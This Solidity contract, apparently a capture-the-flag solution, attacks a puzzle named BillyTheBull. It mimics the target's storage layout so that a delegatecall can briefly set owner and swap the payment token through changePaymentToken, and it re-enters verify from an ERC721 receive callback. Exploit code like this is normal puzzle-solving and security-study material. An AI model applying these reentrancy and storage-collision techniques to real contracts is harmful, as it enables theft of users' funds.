// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { BoredSlothYachtClub } from "../src/tokens/BoredSlothYachtClub.sol";

interface Solver {
    function getMagicFlag(uint, uint) external returns (bytes memory);
}

contract Exploiter {
    address owner;
    NFTOutlet nftOutlet;
    uint nftPrice;
    uint[3] _gap;
    bool flag;
    address immutable solver;
    BillyTheBull constant puzzle = BillyTheBull(0xa0Cb889707d426A7A386870A03bc70d1b0697598); // available
    address constant bsyc = 0xc7183455a4C133Ae270771860664b6B7ec320bB1; // available
    uint immutable t1;
    uint immutable t2;

    constructor(uint _t1, uint _t2) {
        solver = msg.sender;
        t1 = _t1;
        t2 = _t2;
        BoredSlothYachtClub(bsyc).setApprovalForAll(address(nftOutlet), true);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            puzzle.verify(t2 << 128 | t1, uint160(address(this)));
        }
        return this.onERC721Received.selector;
    }

    function getMagicFlag() external returns (bytes memory) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == bsyc) {
            return bytes("");
        } else {
            address oldOwner = owner;
            owner = address(this);
            nftOutlet.changePaymentToken(bsyc);
            owner = oldOwner;
            return Solver(solver).getMagicFlag(t1, t2);
        }
    }
}
